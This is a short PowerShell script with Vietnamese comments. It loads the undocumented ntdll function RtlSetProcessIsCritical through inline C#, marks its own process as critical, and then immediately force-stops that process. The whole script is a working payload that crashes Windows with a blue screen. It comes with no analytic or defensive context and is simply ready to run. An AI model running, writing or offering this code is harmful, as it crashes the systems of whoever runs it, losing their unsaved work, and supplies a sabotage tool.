# Import hàm native để đánh dấu Critical
$code = @"
using System;
using System.Runtime.InteropServices;

public class CriticalProcess
{
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern uint RtlSetProcessIsCritical(bool bNewValue, bool bNeedScb, bool bCheckFlag);
}
"@
Add-Type -AssemblyName System.Console
Add-Type -TypeDefinition $code

# Đánh dấu process là Critical
[CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
Stop-Process -Id $PID -Force


